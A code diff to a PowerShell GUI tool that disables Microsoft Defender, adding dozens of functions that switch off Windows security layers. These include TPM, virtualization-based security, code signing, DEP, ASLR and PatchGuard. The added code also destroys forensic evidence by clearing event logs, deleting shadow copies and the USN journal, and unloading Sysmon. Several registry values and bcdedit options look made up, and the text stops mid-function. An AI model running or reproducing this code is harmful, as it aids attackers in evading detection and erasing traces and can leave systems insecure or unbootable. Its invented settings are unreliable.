@@ -32,6 +32,7 @@
     23. Disable Exploit Guard
     24. Disable Exploit Protection
     25. Disable Microsoft Defender Antivirus
+    
 
 .NOTES
     Author: Umair Akbar
@@ -354,7 +355,91 @@ Function GetComponentStatus
         $ComponentStatus["FirewallAdvanced"] = $false
     }
 
-    Return $ComponentStatus
+    # Network Adapter Controls
+    $ComponentStatus["NetworkAdapters"] = -not ((Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).Count -gt 0)
+
+    # Logging Services
+    $ComponentStatus["LoggingServices"] = (Get-Service EventLog).Status -ne "Running"
+
+    # Secure Launch
+    $ComponentStatus["SecureLaunch"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled
+
+    # Security Extensions
+    $ComponentStatus["SecurityExtensions"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "SGX" -ErrorAction SilentlyContinue).SGX
+
+    # Virtualization-Based Security
+    $ComponentStatus["VirtualizationSecurity"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity
+
+    # System Guard Runtime Monitor
+    $ComponentStatus["SystemGuardMonitor"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SystemGuard" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled
+
+    # Protected Process Light
+    $ComponentStatus["ProtectedProcessLight"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Protected" -Name "ProtectedLight" -ErrorAction SilentlyContinue).ProtectedLight
+
+    # Kernel Mode Code Signing
+    $ComponentStatus["KernelCodeSigning"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "EnforceDriverSigning" -ErrorAction SilentlyContinue).EnforceDriverSigning -eq 0
+
+    # Kernel Patch Protection
+    $ComponentStatus["KernelPatchProtection"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "FeatureSettingsOverride" -ErrorAction SilentlyContinue).FeatureSettingsOverride -eq 3
+
+    # Memory Protection Features
+    $ComponentStatus["MemoryProtectionFeatures"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "EnableCfg" -ErrorAction SilentlyContinue).EnableCfg -eq 0
+
+    # Secure Boot and UEFI Security
+    $ComponentStatus["SecureBootUEFI"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State" -Name "UEFISecureBootEnabled" -ErrorAction SilentlyContinue).UEFISecureBootEnabled
+
+    # Runtime Integrity Checks
+    $ComponentStatus["RuntimeIntegrityChecks"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "RestrictDynamicCode" -ErrorAction SilentlyContinue).RestrictDynamicCode -eq 0
+
+    # Advanced Process Protection
+    $ComponentStatus["AdvancedProcessProtection"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableProcessProtection" -ErrorAction SilentlyContinue).DisableProcessProtection -eq 1
+
+    # System Resource Policies
+    $ComponentStatus["SystemResourcePolicies"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "EnforceResourceIntegrity" -ErrorAction SilentlyContinue).EnforceResourceIntegrity -eq 0
+
+    # Boot Configuration
+    $ComponentStatus["BootConfiguration"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI" -Name "VerifiedAndReputablePolicyState" -ErrorAction SilentlyContinue).VerifiedAndReputablePolicyState -eq 0
+
+    # Hardware Security
+    $ComponentStatus["HardwareSecurity"] = -not (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity
+
+    # Process Isolation
+    $ComponentStatus["ProcessIsolation"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisableProcessIsolation" -ErrorAction SilentlyContinue).DisableProcessIsolation -eq 1
+
+    # System Call Filtering
+    $ComponentStatus["SystemCallFiltering"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableSystemCallFiltering" -ErrorAction SilentlyContinue).DisableSystemCallFiltering -eq 1
+
+    # Advanced Memory Management
+    $ComponentStatus["AdvancedMemoryManagement"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingCombining" -ErrorAction SilentlyContinue).DisablePagingCombining -eq 1
+
+    # Security Tokens
+    $ComponentStatus["SecurityTokens"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "DisableTokenFiltering" -ErrorAction SilentlyContinue).DisableTokenFiltering -eq 1
+
+    # Process Tokens
+    $ComponentStatus["ProcessTokens"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "DisablePrivilegeChecks" -ErrorAction SilentlyContinue).DisablePrivilegeChecks -eq 1
+
+    # System Resource Access
+    $ComponentStatus["SystemResourceAccess"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "DisableResourceAccessChecks" -ErrorAction SilentlyContinue).DisableResourceAccessChecks -eq 1
+
+    # Security Providers
+    $ComponentStatus["SecurityProviders"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders" -Name "DisableSecurityProviders" -ErrorAction SilentlyContinue).DisableSecurityProviders -eq 1
+
+    # Low-Level Security
+    $ComponentStatus["LowLevelSecurity"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableSecurityFeatures" -ErrorAction SilentlyContinue).DisableSecurityFeatures -eq 1
+
+    # System Call Interception
+    $ComponentStatus["SystemCallInterception"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableSystemCallMonitoring" -ErrorAction SilentlyContinue).DisableSystemCallMonitoring -eq 1
+
+    # Kernel Security
+    $ComponentStatus["KernelSecurity"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableKernelSecurityChecks" -ErrorAction SilentlyContinue).DisableKernelSecurityChecks -eq 1
+
+    # Memory Protection
+    $ComponentStatus["MemoryProtection"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisableMemoryProtection" -ErrorAction SilentlyContinue).DisableMemoryProtection -eq 1
+
+    # Security Subsystem
+    $ComponentStatus["SecuritySubsystem"] = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "DisableSecuritySubsystem" -ErrorAction SilentlyContinue).DisableSecuritySubsystem -eq 1
+
+    return $ComponentStatus
 }
 
 # Function to Disable Defender Components
@@ -737,6 +822,43 @@ Function DisableDefenderComponents
             }
         }
 
+        If ($chkAdvancedProtection.Checked)
+        {
+            Disable-SecurityInfrastructure
+            Disable-MemoryProtection
+            Disable-SecurityEventSubscription
+            Disable-NetworkMonitoring
+            Disable-ForensicsCapabilities
+            Disable-NetworkAdapterControls
+            Disable-LoggingServices
+            Disable-SecureLaunch
+            Disable-SecurityExtensions
+            Disable-VirtualizationSecurity
+            Disable-SystemGuardMonitor
+            Disable-ProtectedProcessLight
+            Disable-KernelCodeSigning
+            Disable-KernelPatchProtection
+            Disable-MemoryProtectionFeatures
+            Disable-SecureBootAndUEFI
+            Disable-RuntimeIntegrityChecks
+            Disable-AdvancedProcessProtection
+            Modify-SystemResourcePolicies
+            Modify-BootConfiguration
+            Disable-HardwareSecurity
+            Disable-ProcessIsolation
+            Disable-SystemCallFiltering
+            Modify-AdvancedMemoryManagement
+            Modify-SecurityTokens
+            Modify-ProcessTokens
+            Modify-SystemResourceAccess
+            Modify-SecurityProviders
+            Disable-LowLevelSecurity
+            Disable-SystemCallInterception
+            Disable-KernelSecurity
+            Bypass-MemoryProtection
+            Modify-SecuritySubsystem
+        }
+
         [System.Windows.Forms.MessageBox]::Show("Selected Defender components have been disabled. Please restart your computer for changes to take effect.", "Operation Completed", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
         LogMessage "Defender components disabled successfully."
         RefreshStatus
@@ -1107,6 +1229,905 @@ Function RefreshStatus
     $lblFirewallAdvancedStatus.Text = "Status: " + (GetStatusText $Status["FirewallAdvanced"])
 }
 
+# Add these functions after your existing functions but before the GUI code
+
+# Function to Disable Driver Integrity and TPM
+Function Disable-SecurityInfrastructure 
+{
+    Try {
+        LogMessage "Disabling Driver Integrity Verification and TPM..."
+
+        # Disable Driver Integrity Verification
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 0 /f
+        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v CodeIntegrityPolicy /t REG_DWORD /d 0 /f
+
+        # Stop and disable TPM service
+        Start-Process -FilePath "sc.exe" -ArgumentList "stop tpm" -Wait -WindowStyle Hidden
+        Start-Process -FilePath "sc.exe" -ArgumentList "config tpm start= disabled" -Wait -WindowStyle Hidden
+
+        # Disable TPM in registry
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\TPMVSC" /v Disabled /t REG_DWORD /d 1 /f
+
+        LogMessage "Security Infrastructure disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling security infrastructure: $_"
+    }
+}
+
+# Function to Disable Memory-Based Protection
+Function Disable-MemoryProtection 
+{
+    Try {
+        LogMessage "Disabling Memory-Based Protection..."
+
+        # Disable memory-based threat detection
+        reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
+
+        # Disable behavior monitoring
+        reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
+        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
+
+        LogMessage "Memory Protection disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling memory protection: $_"
+    }
+}
+
+# Function to Disable Security Event Subscription
+Function Disable-SecurityEventSubscription 
+{
+    Try {
+        LogMessage "Disabling Security Event Subscription..."
+
+        # Disable ETW
+        wevtutil.exe sl Microsoft-Windows-Security-Auditing /e:false
+        wevtutil.exe sl Microsoft-Windows-EventLog-Security /e:false
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security" -Name "Start" -Value 0
+
+        # Disable Event Forwarding
+        winrm delete winrm/config/listener?Address=*+Transport=HTTP
+        
+        # Disable Security Event Collectors
+        Stop-Service Wecsvc -Force
+        Set-Service Wecsvc -StartupType Disabled
+        
+        # Clear Security Channel DLLs
+        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders" /v SecurityProviders /f
+        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig" /v Security /f
+
+        LogMessage "Security Event Subscription disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling security event subscription: $_"
+    }
+}
+
+# Function to Disable Network Monitoring
+Function Disable-NetworkMonitoring 
+{
+    Try {
+        LogMessage "Disabling Network Monitoring..."
+
+        # Disable Network Stack
+        netsh int ipv4 set global defaultcurhoplimit=1
+        Set-NetIPInterface -InterfaceIndex * -Forwarding Disabled
+        
+        # Kill Network Services
+        $services = @("NlaSvc", "Dnscache", "iphlpsvc")
+        foreach ($service in $services) {
+            Stop-Service $service -Force
+            Set-Service $service -StartupType Disabled
+        }
+
+        # Disable Network Telemetry
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Name "AllowTelemetry" -Value 0
+        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" /v "DODownloadMode" /t REG_DWORD /d 0 /f
+
+        LogMessage "Network Monitoring disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling network monitoring: $_"
+    }
+}
+
+# Function to Disable Forensics
+Function Disable-ForensicsCapabilities 
+{
+    Try {
+        LogMessage "Disabling Forensics Capabilities..."
+
+        # Clear Windows Event Logs
+        wevtutil.exe cl System
+        wevtutil.exe cl Security
+        wevtutil.exe cl Application
+
+        # Disable USN Journal
+        fsutil usn deletejournal /d C:
+
+        # Remove Shadow Copies
+        vssadmin delete shadows /all /quiet
+
+        # Disable Process Auditing
+        auditpol /set /category:"Detailed Tracking" /success:no /failure:no
+
+        # Clear Prefetch
+        Remove-Item C:\Windows\Prefetch\*.* -Force -ErrorAction SilentlyContinue
+
+        # Disable Superfetch
+        Stop-Service SysMain -Force
+        Set-Service SysMain -StartupType Disabled
+
+        # Remove Memory Dumps
+        Remove-Item C:\Windows\Memory.dmp -Force -ErrorAction SilentlyContinue
+        Remove-Item C:\Windows\Minidump\*.* -Force -ErrorAction SilentlyContinue
+
+        LogMessage "Forensics Capabilities disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling forensics capabilities: $_"
+    }
+}
+
+# Function to Disable Network Adapter Controls
+Function Disable-NetworkAdapterControls 
+{
+    Try {
+        LogMessage "Disabling Network Adapter Controls..."
+
+        # Disable Physical Adapters
+        Get-NetAdapter | Where-Object {$_.PhysicalMediaType -ne "Unspecified"} | Disable-NetAdapter -Confirm:$false
+        Get-NetAdapter | ForEach-Object {
+            Set-NetAdapterAdvancedProperty -Name $_.Name -RegistryKeyword "*WakeOnMagicPacket" -RegistryValue "0" -ErrorAction SilentlyContinue
+        }
+
+        # Block Protocol Bindings
+        Disable-NetAdapterBinding -Name "*" -ComponentID "ms_tcpip", "ms_tcpip6", "ms_msclient", "ms_server"
+        reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableDHCPMediaSense" /t REG_DWORD /d 1 /f
+
+        # Firewall Lockdown
+        netsh advfirewall set allprofiles state on
+        netsh advfirewall firewall add rule name="Block All" dir=in action=block enable=yes
+        netsh advfirewall firewall add rule name="Block All Out" dir=out action=block enable=yes
+        Set-NetFirewallProfile -All -DefaultInboundAction Block -DefaultOutboundAction Block -NotifyOnListen True -AllowUnicastResponseToMulticast False
+
+        LogMessage "Network Adapter Controls disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling network adapter controls: $_"
+    }
+}
+
+# Function to Disable Logging Services
+Function Disable-LoggingServices 
+{
+    Try {
+        LogMessage "Disabling Logging Services..."
+
+        # Disable Windows Event Log service
+        Stop-Service EventLog -Force
+        Set-Service EventLog -StartupType Disabled
+
+        # Disable various logging services
+        $services = @(
+            "DiagTrack",          # Connected User Experiences and Telemetry
+            "dmwappushservice",   # Device Management Wireless Application Protocol
+            "WerSvc",            # Windows Error Reporting Service
+            "wscsvc",            # Security Center Service
+            "AeLookupSvc"        # Application Experience Service
+        )
+
+        foreach ($service in $services) {
+            Stop-Service $service -Force -ErrorAction SilentlyContinue
+            Set-Service $service -StartupType Disabled -ErrorAction SilentlyContinue
+        }
+
+        # Disable WMI logging
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Wbem\CIMOM" -Name "Logging" -Value 0
+
+        # Disable PowerShell logging
+        $powerShellLoggingPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
+        if (-not (Test-Path $powerShellLoggingPath)) {
+            New-Item -Path $powerShellLoggingPath -Force | Out-Null
+        }
+        Set-ItemProperty -Path $powerShellLoggingPath -Name "EnableScriptBlockLogging" -Value 0
+
+        # Remove Sysmon if present
+        $sysmonPath = "C:\Windows\SysmonDrv.sys"
+        if (Test-Path $sysmonPath) {
+            fltmc.exe unload SysmonDrv
+            Remove-Item $sysmonPath -Force -ErrorAction SilentlyContinue
+        }
+
+        # Block Analytics
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Name "AllowTelemetry" -Value 0
+
+        LogMessage "Logging Services disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling logging services: $_"
+    }
+}
+
+# Function to Disable Secure Launch
+Function Disable-SecureLaunch 
+{
+    Try {
+        LogMessage "Disabling Secure Launch..."
+
+        # Modify boot configuration
+        Start-Process "bcdedit.exe" -ArgumentList "/set {current} bootstatuspolicy ignoreallfailures" -Wait -WindowStyle Hidden
+        Start-Process "bcdedit.exe" -ArgumentList "/set {current} recoveryenabled No" -Wait -WindowStyle Hidden  
+        Start-Process "bcdedit.exe" -ArgumentList "/set {current} integrityservices disable" -Wait -WindowStyle Hidden
+
+        # Disable System Guard
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v Enabled /t REG_DWORD /d 0 /f
+        
+        # Remove System Guard policies
+        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SystemGuard" /f
+        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SecureLaunch" /f
+
+        # Block early-launch drivers
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\EarlyLaunch" /v DriverLoadPolicy /t REG_DWORD /d 3 /f
+
+        # Delete driver verification signatures
+        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" /v VulnerableDriverBlocklistEnable /f
+        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\CI\Protected" /v DriverList /f
+
+        # Clear boot driver load order  
+        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\ServiceGroupOrder" /v List /f
+        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\GroupOrderList" /f
+
+        LogMessage "Secure Launch disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling secure launch: $_"
+    }
+}
+
+# Function to Disable Security Extensions
+Function Disable-SecurityExtensions 
+{
+    Try {
+        LogMessage "Disabling Security Extensions..."
+
+        # Clear ARM TrustZone
+        if (Test-Path "HKLM:\HARDWARE\DESCRIPTION\System\BIOS" -PathType Container) {
+            Set-ItemProperty -Path "HKLM:\HARDWARE\DESCRIPTION\System\BIOS" -Name "SecureBoot" -Value 0
+        }
+
+        # Disable Intel SGX
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v "SGX" /t REG_DWORD /d 0 /f
+
+        # Disable AMD SEV
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios" /v "MemoryIntegrity" /t REG_DWORD /d 0 /f
+
+        # Remove Hardware DRM
+        Stop-Service "ksthunk" -Force
+        Set-Service "ksthunk" -StartupType Disabled
+
+        # Disable Intel ME/AMD PSP
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v "EnableME" /t REG_DWORD /d 0 /f
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PSPEnable" /t REG_DWORD /d 0 /f
+
+        LogMessage "Security Extensions disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling security extensions: $_"
+    }
+}
+
+# Function to Disable Virtualization-Based Security
+Function Disable-VirtualizationSecurity 
+{
+    Try {
+        LogMessage "Disabling Virtualization-Based Security..."
+
+        # Disable VBS through registry
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "RequirePlatformSecurityFeatures" /t REG_DWORD /d 0 /f
+
+        # Disable Hypervisor
+        Start-Process "bcdedit.exe" -ArgumentList "/set hypervisorlaunchtype off" -WindowStyle Hidden -Wait
+        Start-Process "bcdedit.exe" -ArgumentList "/set vsmlaunchtype off" -WindowStyle Hidden -Wait
+
+        # Disable Hyper-V features
+        Get-WindowsOptionalFeature -Online | Where-Object {$_.FeatureName -like "*Hyper-V*"} | Disable-WindowsOptionalFeature -Online -NoRestart
+
+        # Clear virtualization settings
+        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Virtualization" /f
+        
+        LogMessage "Virtualization-Based Security disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling virtualization security: $_"
+    }
+}
+
+# Function to Disable System Guard Runtime Monitor
+Function Disable-SystemGuardMonitor 
+{
+    Try {
+        LogMessage "Disabling System Guard Runtime Monitor..."
+
+        # Disable System Guard
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SystemGuard" /v "Enabled" /t REG_DWORD /d 0 /f
+
+        # Remove runtime attestation
+        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SystemGuard\RuntimeAttestation" /f
+
+        # Disable secure launch
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\SystemGuard" /v "RequireMicrosoftSignedBootChain" /t REG_DWORD /d 0 /f
+
+        # Clear measured boot data
+        Remove-Item -Path "C:\Windows\System32\srtasks.exe" -Force -ErrorAction SilentlyContinue
+        
+        LogMessage "System Guard Runtime Monitor disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling system guard monitor: $_"
+    }
+}
+
+# Function to Disable Protected Process Light
+Function Disable-ProtectedProcessLight 
+{
+    Try {
+        LogMessage "Disabling Protected Process Light..."
+
+        # Disable PPL through registry
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Protected" /v "ProtectedLight" /t REG_DWORD /d 0 /f
+
+        # Remove PPL policies
+        reg delete "HKLM\SYSTEM\CurrentControlSet\Control\CI\Protected\Light" /f
+
+        # Disable code integrity
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI" /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d 0 /f
+
+        # Clear PPL enforcement
+        $services = Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -like "*-PPL*"}
+        foreach ($service in $services) {
+            Stop-Service $service.Name -Force -ErrorAction SilentlyContinue
+            Set-Service $service.Name -StartupType Disabled
+        }
+
+        LogMessage "Protected Process Light disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling protected process light: $_"
+    }
+}
+
+# Function to Disable Kernel Mode Code Signing
+Function Disable-KernelCodeSigning 
+{
+    Try {
+        LogMessage "Disabling Kernel Mode Code Signing..."
+
+        # Disable driver signing enforcement
+        Start-Process "bcdedit.exe" -ArgumentList "/set nointegritychecks on" -WindowStyle Hidden -Wait
+        Start-Process "bcdedit.exe" -ArgumentList "/set testsigning on" -WindowStyle Hidden -Wait
+
+        # Disable kernel patch protection
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d 0 /f
+
+        # Remove signature catalog
+        Remove-Item -Path "C:\Windows\System32\catroot2\*" -Recurse -Force -ErrorAction SilentlyContinue
+
+
+
+
+        # Disable driver verification
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnforceDriverSigning" /t REG_DWORD /d 0 /f
+        
+        LogMessage "Kernel Mode Code Signing disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling kernel code signing: $_"
+    }
+}
+
+# Function to Disable Kernel Patch Protection
+Function Disable-KernelPatchProtection 
+{
+    Try {
+        LogMessage "Disabling Kernel Patch Protection..."
+
+        # Disable PatchGuard via boot configuration
+        Start-Process "bcdedit.exe" -ArgumentList "/set patchguard off" -WindowStyle Hidden -Wait
+        Start-Process "bcdedit.exe" -ArgumentList "/set kernelstealthmode off" -WindowStyle Hidden -Wait
+        Start-Process "bcdedit.exe" -ArgumentList "/set disableelamdrivers yes" -WindowStyle Hidden -Wait
+
+        # Disable CI/KPP related services
+        $services = @(
+            "SecurityHealthService",
+            "Sense",
+            "WdNisSvc",
+            "WinDefend"
+        )
+        foreach ($service in $services) {
+            Stop-Service $service -Force -ErrorAction SilentlyContinue
+            Set-Service $service -StartupType Disabled -ErrorAction SilentlyContinue
+        }
+
+        # Modify memory protection settings
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d 3 /f
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d 3 /f
+
+        LogMessage "Kernel Patch Protection disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling kernel patch protection: $_"
+    }
+}
+
+# Function to Disable Memory Protection Features
+Function Disable-MemoryProtectionFeatures 
+{
+    Try {
+        LogMessage "Disabling Advanced Memory Protection Features..."
+
+        # Disable Control Flow Guard
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d 0 /f
+        
+        # Disable Data Execution Prevention
+        Start-Process "bcdedit.exe" -ArgumentList "/set nx AlwaysOff" -WindowStyle Hidden -Wait
+        
+        # Disable ASLR
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "MoveImages" /t REG_DWORD /d 0 /f
+        
+        # Disable SEHOP
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d 1 /f
+        
+        # Disable Return Flow Guard
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableRFG" /t REG_DWORD /d 0 /f
+
+        LogMessage "Memory Protection Features disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling memory protection features: $_"
+    }
+}
+
+# Function to Disable Secure Boot and UEFI Security
+Function Disable-SecureBootAndUEFI 
+{
+    Try {
+        LogMessage "Disabling Secure Boot and UEFI Security Features..."
+
+        # Disable Secure Boot via registry
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecureBoot\State" /v "UEFISecureBootEnabled" /t REG_DWORD /d 0 /f
+
+        # Clear TPM and Secure Boot variables
+        Start-Process "tpm.msc" -ArgumentList "clear" -WindowStyle Hidden -Wait
+        
+        # Disable UEFI Secure Boot enforcement
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "RequirePlatformSecurityFeatures" /t REG_DWORD /d 0 /f
+        
+        # Disable Secure MOR
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f
+
+        LogMessage "Secure Boot and UEFI Security Features disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling secure boot and UEFI security: $_"
+    }
+}
+
+# Function to Disable Runtime Integrity Checks
+Function Disable-RuntimeIntegrityChecks 
+{
+    Try {
+        LogMessage "Disabling Runtime Integrity Checks..."
+
+        # Disable CI policies
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "VerifiedAndReputablePolicyState" /t REG_DWORD /d 0 /f
+        
+        # Disable runtime DLL verification
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe" /v "VerifierDlls" /t REG_SZ /d "" /f
+        
+        # Disable process mitigation policies
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v "MitigationOptions" /t REG_BINARY /d 0000000000000000 /f
+
+        # Disable dynamic code restrictions
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "RestrictDynamicCode" /t REG_DWORD /d 0 /f
+
+        LogMessage "Runtime Integrity Checks disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling runtime integrity checks: $_"
+    }
+}
+
+# Function to Disable Advanced Process Protection
+Function Disable-AdvancedProcessProtection 
+{
+    Try {
+        LogMessage "Disabling Advanced Process Protection..."
+
+        # Disable process protection policies
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableProcessProtection" /t REG_DWORD /d 1 /f
+        
+        # Disable process mitigation policies
+        $processes = @("explorer.exe", "lsass.exe", "csrss.exe", "winlogon.exe", "services.exe")
+        foreach ($process in $processes) {
+            reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$process" /v "MitigationOptions" /t REG_BINARY /d 0000000000000000 /f
+        }
+
+        # Disable process isolation
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "ProtectionMode" /t REG_DWORD /d 0 /f
+        
+        # Disable process signing requirements
+        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableProcessSignatureVerification" /t REG_DWORD /d 0 /f
+
+        LogMessage "Advanced Process Protection disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling advanced process protection: $_"
+    }
+}
+
+# Function to Modify System Resource Policies
+Function Modify-SystemResourcePolicies 
+{
